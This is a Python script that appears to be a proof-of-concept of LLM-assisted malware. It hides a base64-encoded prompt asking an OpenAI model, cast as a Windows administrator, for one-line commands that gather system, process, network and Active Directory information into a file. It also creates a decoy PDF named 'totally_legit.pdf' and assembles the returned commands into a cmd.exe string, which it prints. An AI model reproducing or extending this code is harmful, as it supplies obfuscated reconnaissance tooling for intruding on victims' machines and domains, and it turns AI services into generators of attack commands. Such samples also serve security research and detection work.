import base64
import os
from pathlib import Path
from openai import OpenAI
from dotenv import load_dotenv

from utils import gen_pdf
class LameException(Exception):
    pass

COMMANDS_QUERRY = """TWFrZSBhIGxpc3Qgb2YgY29tbWFuZHMgdG8gY3JlYXRlIGZvbGRlciBDOlxsYW1lc3RcaW5mbyBhbmQgdG8gZ2F0aGVyIGNvbXB1dGVyIGluZm9ybWF0aW9uLCBoYXJkd2FyZSBpbmZvcm1hdGlvbiwgcHJvY2VzcyBhbmQgc2VydmljZXMgaW5mb3JtYXRpb24sIG5ldHdvcmtzIGluZm9ybWF0aW9uLCBBRCBkb21haW4gaW5mb3JtYXRpb24sIHRvIGV4ZWN1dGUgaW4gb25lIGxpbmUgYW5kIGFkZCBlYWNoIHJlc3VsdCB0byB0ZXh0IGZpbGUgYzpcbGFtZVxpbmZvLnR4dC4gUmV0dXJuIG9ubHkgY29tbWFuZHMsIHdpdGhvdXQgbWFya2Rvd24u"""

def get_commands(key):
    client = OpenAI(api_key=key)
    try:
        response = client.responses.create(
            model="gpt-3.5-turbo",
            instructions="you are a windows system administrator",
            temperature=0.1,
            input=str(base64.b64decode(COMMANDS_QUERRY))
        )
    except Exception as e:
        print(f"error: {e}")
        raise e
    
    if response.error is not None:
        raise LameException(response.error)
    return response.output_text

def gen_artifacts(decoy_pdf):
        if not decoy_pdf.exists():
            gen_pdf(decoy_pdf)

def main():
    load_dotenv()

    current_dir = Path.cwd();
    pdf_loc = current_dir / "totally_legit.pdf"
    gen_artifacts(pdf_loc)

    my_api_key = os.getenv('OPEN_API_KEY')
    if my_api_key is None:
        raise LameException("No Key")
    commands = "cmd.exe " + get_commands(my_api_key)
    print(commands)


if __name__ == "__main__":

    main()